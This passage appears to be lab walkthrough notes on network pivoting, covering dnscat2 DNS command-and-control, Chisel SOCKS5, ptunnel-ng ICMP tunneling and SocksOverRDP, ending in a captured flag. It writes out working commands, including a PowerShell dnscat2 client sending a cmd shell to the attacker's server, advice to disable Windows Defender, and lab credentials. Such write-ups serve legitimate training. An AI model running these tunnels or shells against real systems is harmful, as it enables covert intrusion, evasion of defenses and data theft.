    WIN_C -- 1. Execute Dnscat2 Client 👻 --> DNS_I

    %% 2. The internal DNS attempts to resolve the external request (which is the tunnel traffic)
    DNS_I -- 2. Exfiltration Query (DNS) ❓ --> FIREWALL

    %% 3. The Firewall allows external DNS traffic (UDP port 53)
    FIREWALL -- 3. Allowed Traffic (DNS) ✅ --> DNS_E

    %% 4. The external DNS cannot resolve the malicious domain and forwards it to the attacker's DNS server (the C&C Server)
    DNS_E -- 4. Malicious DNS Query Forwarding ➡️ --> DNSCAT_S

    %% 5. The C&C Server encapsulates the response and returns the C&C command (in TXT Records)
    DNSCAT_S -- 5. Encapsulated C2 Response (TXT Records) 📦 --> DNS_E

    %% 6. The C2 response returns to the client
    DNS_E -- 6. C2 Response (TXT Records) ↩️ --> FIREWALL
    FIREWALL -- 7. C2 Reply 📩 --> DNS_I
    DNS_I -- 8. C2 Delivery to Client 🎯 --> WIN_C

    %% Tunnel Data Flow (Emphasis on Exfiltration)
    WIN_C -.-|**DNS Tunnel 🚇 - TXT Records / Encrypted C2**| DNSCAT_S

    %% Styling
    style ATT fill:#1a2332,stroke:#9ACD32,stroke-width:3px,color:#fff
    style CORP fill:#1a2332,stroke:#9ACD32,stroke-width:3px,color:#fff
    style DNSCAT_S fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
    style WIN_C fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
    style DNS_I fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
    style FIREWALL fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
    style DNS_E fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff

    %% Link Styling
    %% Exfiltration Data Flow (Highlighted in Dashed Red for C2)
    linkStyle 8 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
```



**Cloning dnscat2 and Setting Up the Server**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

</td>
</tr>
</table>

**Starting the dnscat2 server**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

</td>
</tr>
</table>

After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use dnscat2-powershell, a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.

**Cloning dnscat2-powershell to the Attack Host**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

</td>
</tr>
</table>

Once the **dnscat2.ps1** file is on the target we can import it and run associated cmd-lets. After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.

**Importing dnscat2.ps1**

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

</td>
</tr>
</table>

We must use the pre-shared secret (-PreSharedSecret) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.

**Confirming Session Establishment**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
# New window created: 1
# Session 1 Security: ENCRYPTED AND VERIFIED!
# (the security depends on the strength of your pre-shared secret!)

dnscat2>
```

</td>
</tr>
</table>

We can list the options we have with dnscat2 by entering ? at the prompt.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
dnscat2> ?
```

</td>
</tr>
<tr>
<td colspan="2">

---

```text
Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

</td>
</tr>
</table>

We can use dnscat2 to interact with sessions and move further in a target environment on engagements. Let's interact with our established session and drop into a shell.

**Interacting with the Established Session**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
dnscat2> window -i 1
# New window created: 1
# history_size (session) => 1000
# Session 1 Security: ENCRYPTED AND VERIFIED!
# (the security depends on the strength of your pre-shared secret!)
# This is a console session!

# That means that anything you type will be sent as-is to the
# client, and anything they type will be displayed as-is on the
# screen! If the client is executing a command and you don't
# see a prompt, try typing 'pwd' or something!

# To go back, type ctrl-z.

# Microsoft Windows [Version 10.0.18363.1801]
# (c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

</td>
</tr>
</table>

</details>

<details>
<summary><h2>SOCKS5 Tunneling with Chisel</h2></summary>

Chisel is a fast TCP/UDP tunneling tool written in Go. It encapsulates traffic within HTTP and secures it via SSH, making it ideal for bypassing strict firewall rules that only allow web traffic.

**Core Features:**

- **Transport:** Uses HTTP to carry data.
- **Security:** Traffic is encrypted using SSH.
- **Connectivity:** Capable of creating client-server tunnels in highly restricted environments.

**Scenario: Pivoting to the Internal Network (172.16.5.0/23)**
In this scenario, the Attack Host cannot reach the **Domain Controller (172.16.5.19)** directly. We use the compromised **Ubuntu Server** as a pivot point.

**Execution Flow:**

_Pivot Point (Ubuntu Server):_

- Acts as the **Chisel Server**.
- Listens on a specific port for incoming connections from the attacker.
- Forwards the tunneled traffic into the internal 172.16.5.0/23 segment.

_Attack Host:_

- Acts as the **Chisel Client**.
- Connects to the Ubuntu Server to establish the tunnel.

**Result:**
The attacker can now reach the **Domain Controller** or any webserver on the internal network through the tunnel.

**1. Download the release binary, unzip it, rename it to 'chisel' and make it executable**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gzip -d chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel
```

</td>
</tr>
</table>

**2. Transfer Chisel Binary to Pivot Host**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
scp chisel ubuntu@10.129.2.82:~/
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
# The authenticity of host '10.129.2.82 (10.129.2.82)' can't be established.
# ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
# This key is not known by any other names.
# Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
# Warning: Permanently added '10.129.2.82' (ED25519) to the list of known hosts.
# ubuntu@10.129.2.82's password:
# chisel                                                                                      100% 8452KB   1.7MB/s   00:04
```

</td>
</tr>
</table>

**3. SSH to the Ubuntu machine**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ssh ubuntu@10.129.2.82
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
# The authenticity of host '10.129.202.64 (10.129.202.64)' can't be established.
# ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
# This key is not known by any other names.
# Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
# Warning: Permanently added '10.129.202.64' (ED25519) to the list of known hosts.
# ubuntu@10.129.202.64's password:
```

</td>
</tr>
</table>

**4. Start the Chisel server in the Ubuntu machine**

<table width="100%">
<tr>
<td colspan="2"> 🚇 <b>bash — Linux - Pivot</b> </td>
</tr>
<tr>
<td width="20%">

**`ubuntu@10.129.2.82:~$`**

</td>
<td>

```bash
./chisel server -v -p 1234 --socks5
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
# 2026/01/22 02:46:36 server: Fingerprint +GRyOYAbt/Lns8wZBAXsIgJlbg8NtFxPddSx7HXjteM=
# 2026/01/22 02:46:36 server: Listening on http://0.0.0.0:1234
```

</td>
</tr>
</table>

**5. Start the Chisel client in the Attack machine**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
./chisel client -v 10.129.2.82:1234 socks
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
# 2026/01/21 20:47:30 client: Connecting to ws://10.129.2.82:1234
# 2026/01/21 20:47:30 client: tun: proxy#127.0.0.1:1080=>socks: Listening
# 2026/01/21 20:47:30 client: tun: Bound proxies
# 2026/01/21 20:47:30 client: Handshaking...
# 2026/01/21 20:47:31 client: Sending config
# 2026/01/21 20:47:31 client: Connected (Latency 66.442711ms)
# 2026/01/21 20:47:31 client: tun: SSH connected
```

</td>
</tr>
</table>

**6. Configure Proxychains to use SOCKS5**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
tail -f /etc/proxychains.conf
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
[ProxyList]
# add proxy here ...
# meanwile
# # defaults set to "tor"

socks5 127.0.0.1 1080
```

</td>
</tr>
</table>

**7. Use xfreerdp through proxychains to gain access to the target server**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

</td>
</tr>
</table>

</details>

<details>
<summary><h2>ICMP Tunneling with SOCKS</h2></summary>

**ICMP Tunneling Overview:** A technique that encapsulates traffic within ICMP echo requests and responses. It requires the firewall to permit outbound ICMP traffic (pings) to external servers.

**Use Cases:** Highly effective for data exfiltration and establishing pivot tunnels to external infrastructure.

**Implementation with ptunnel-ng:**
**ptunnel-ng** can be used from the client and server-side.

- **Server-side:** Run ptunnel-ng on the target/pivot host.
- **Client-side:** Run the client on the attack host to establish the tunnel.
- **Result:** All traffic is proxied through the ICMP-based tunnel.

**1. Clone and compile ptunnel-ng statically on the Attack Host**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
git clone https://github.com/utoni/ptunnel-ng.git
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
# Cloning into 'ptunnel-ng'...
# remote: Enumerating objects: 1413, done.
# remote: Counting objects: 100% (319/319), done.
# remote: Compressing objects: 100% (137/137), done.

# ...

# /usr/bin/ld: ptunnel_ng-utils.o: in function `host_to_addr':
#   /home/htb-ac-1640397/ptunnel-ng/src/utils.c:126: warning: Using 'getaddrinfo' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
#   /usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/12/../../../x86_64-linux-gnu/libcrypto.a(libcrypto-lib-bio_sock.o): in function `BIO_gethostbyname':
#   (.text+0x81): warning: Using 'gethostbyname' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
#   make[2]: Leaving directory '/home/htb-ac-1640397/ptunnel-ng/src'
#   make[1]: Leaving directory '/home/htb-ac-1640397/ptunnel-ng/src'
#   make[1]: Entering directory '/home/htb-ac-1640397/ptunnel-ng'
#   make[1]: Nothing to be done for 'all-am'.
#   make[1]: Leaving directory '/home/htb-ac-1640397/ptunnel-ng'
```

</td>
</tr>
</table>

**2. Verify that the binary is statically linked**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ldd src/ptunnel-ng
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
# not a dynamic executable
```

</td>
</tr>
</table>

**3. Transfer the binary to the Pivot Host**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
# ubuntu@10.129.202.64's password:
# output.1 100% 224KB 664.9KB/s 00:00
# traces.0 100% 53KB 390.8KB/s 00:00
# traces.1 100% 54KB 399.6KB/s 00:00
# ...
# config.log 100% 61KB 450.1KB/s 00:00
# compile.sh 100% 199 2.9KB/s 00:00
# ptunnel-ng.te 100% 2019 29.4KB/s 00:00
```

</td>
</tr>
</table>

**4. Connect to the Pivot Host**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
ssh ubuntu@10.129.202.64
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
# ubuntu@10.129.202.64's password:
# Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
```

</td>
</tr>
</table>

**5. Start the ptunnel-ng server on the Pivot Host**

<table width="100%">
<tr>
<td colspan="2"> 🚇 <b>bash — Linux - Pivot</b> </td>
</tr>
<tr>
<td width="20%">

**`pivot@host:~$`**

</td>
<td>

```bash
sudo ~/ptunnel-ng/src/ptunnel-ng
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
# [inf]: Starting ptunnel-ng 1.42.
# [inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
# [inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
# [inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
# [inf]: Forwarding incoming ping packets over TCP.
# [inf]: Ping proxy is listening in privileged mode.
# [inf]: Dropping privileges now.
```

</td>
</tr>
</table>

**6. Establish the ICMP tunnel by mapping the remote RDP port**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
sudo ~/ptunnel-ng/src/ptunnel-ng -p10.129.202.64 -l3389 -r172.16.5.19 -R3389
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
# [inf]: Starting ptunnel-ng 1.42.
# [inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
# [inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
# [inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
# [inf]: Relaying packets from incoming TCP streams.
```

</td>
</tr>
</table>

**7. Connect via RDP using the local mapped port**

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
xfreerdp /v:127.0.0.1 /u:victor /p:pass@123 /cert:ignore
```

</td>
</tr>
<tr>
<td colspan="2">

---

```bash
# [19:53:30:165] [126059:126060] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-1640397/.config/freerdp
# [19:53:30:165] [126059:126060] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-1640397/.config/freerdp/certs]
# [19:53:30:165] [126059:126060] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-1640397/.config/freerdp/server]
```

</td>
</tr>
</table>

</details>

<details>
<summary><h2>RDP and SOCKS Tunneling with SocksOverRDP</h2></summary>

This method leverages **Dynamic Virtual Channels (DVC)** from the Windows Remote Desktop Service to tunnel traffic. It is an excellent alternative when SSH access is restricted or unavailable within a Windows network.

### 🛠️ Required Binaries

- **SocksOverRDP (x64 Binaries):** The core tool for the tunnel.
- **Proxifier Portable:** To manage the proxy settings on the attack host.
- **xfreerdp:** RDP client used to establish the initial connection.

---

**1. Attack Host Preparation**

Ensure you have the following binaries ready to be transferred to the target:

- [SocksOverRDPx64.zip](https://github.com/nccgroup/SocksOverRDP/releases)
- [ProxifierPE.zip](https://www.proxifier.com/download/#win-tab) (Portable Edition)

**2. Connection and File Transfer**

Connect to the target via RDP and mount a local drive to transfer the tools.

> **Note:** Use absolute paths for the shared drive to avoid `PostFilter rule` parsing errors in `xfreerdp`.

<table width="100%">
<tr>
<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`kali@kali:~$`**

</td>
<td>

```bash
xfreerdp /v:10.129.1.181 /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:share,/home/htb-ac-1640397/Downloads
```

</td>
</tr>
</table>

**3. Registering the DLL on Target**

Once inside the initial Windows foothold (10.129.x.x), move the `SocksOverRDP-Plugin.dll` to your working directory and register it.

> **NOTE:** Troubleshooting: regsvr32.exe Errors
>
> - File Disappears: If Windows Defender quarantines the .dll, disable Real-Time Protection or add a folder exclusion.
> - Error 0x80070005 (Access Denied): You must run regsvr32.exe from an Administrator: Command Prompt. Standard user prompts will fail to write to the registry.

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Initial Foothold (10.129.x.x)</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\Users\htb-student\Desktop\SocksOverRDP-x64>`**

</td>
<td>

```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
```

</td>
</tr>
</table>

**4. Establishing the Foundational RDP Connection**

With the `.dll` registered, connect to the first internal pivot target using the native Windows client (`mstsc.exe`).

- **Target IP:** `172.16.5.19`
- **Credentials:** `victor : pass@123`

Upon successfully authenticating, a prompt will appear confirming that the **SocksOverRDP plugin** is enabled and will listen on `127.0.0.1:1080` once the server is executed.

**5. Executing the Server Component**

Transfer `SocksOverRDP-Server.exe` to the remote host (`172.16.5.19`). Open an Administrator Command Prompt and start the tunnel:

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Internal Server</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\Users\victor\Desktop>`**

</td>
<td>

```cmd
SocksOverRDP-Server.exe
```

</td>
</tr>
<tr>
<td colspan="2">

---

```text
Socks Over RDP by Balazs Bucsay [[@xoreipeip]]
[*] Channel opened over RDP
```

</td>
</tr>
</table>

Back on your Initial Foothold (`10.129.x.x`) machine, verify the SOCKS listener is active:

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Initial Foothold (10.129.x.x)</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
netstat -antb | findstr 1080
```

</td>
</tr>
<tr>
<td colspan="2">

---

```text
TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
```

</td>
</tr>
</table>

**6. Proxifier Configuration**

Transfer and open **Proxifier Portable** on the `10.129.x.x` machine. You must configure precise rules (`Profile -> Proxification Rules`) to prevent routing loops and immediate disconnects.

**Required Rules:**

- **Pivot Bypass (Crucial):**
  - **Applications:** `mstsc.exe`
  - **Target Hosts:** `172.16.5.19`
  - **Action:** `Direct` (Prevents tunneling the tunnel)

- **Target Route:**
  - **Applications:** `mstsc.exe`
  - **Target Hosts:** `172.16.6.155`
  - **Action:** `Proxy SOCKS5 127.0.0.1:1080`

- **Default Route:**
  - **Action:** `Direct` (If left as proxy, Windows background CRL checks on port 80 will fail over the isolated tunnel, causing RDP to instantly close with a `<1 sec` lifetime).

**7. The Final Pivot**

With Proxifier running (ensure it is running as an Administrator if you launched your terminal as Admin), open a new `mstsc.exe` instance and connect to the deep network target:

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Initial Foothold (10.129.x.x)</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
mstsc.exe /v:172.16.6.155
```

</td>
</tr>
</table>

Authenticate with the final credentials (jason : WellConnected123!) to access the desktop and retrieve `Flag.txt`.

**8. Retrieving the Flag**

Once connected to Jason's machine (`172.16.6.155`), open the command prompt and navigate to the Desktop to locate and read the objective file.

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows - Final Target (172.16.6.155)</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\Users\jason\Desktop>`**

</td>
<td>

```cmd
dir
```

</td>
</tr>
<tr>
<td colspan="2">

```text
Volume in drive C has no label.
 Volume Serial Number is 7A4B-9C2D

 Directory of C:\Users\jason\Desktop

02/18/2026  11:45 AM    <DIR>          .
02/18/2026  11:45 AM    <DIR>          ..
02/18/2026  11:30 AM                34 Flag.txt
               1 File(s)             34 bytes
               2 Dir(s)  12,543,981,568 bytes free
```

</td>
</tr>

</details>

</details>

---
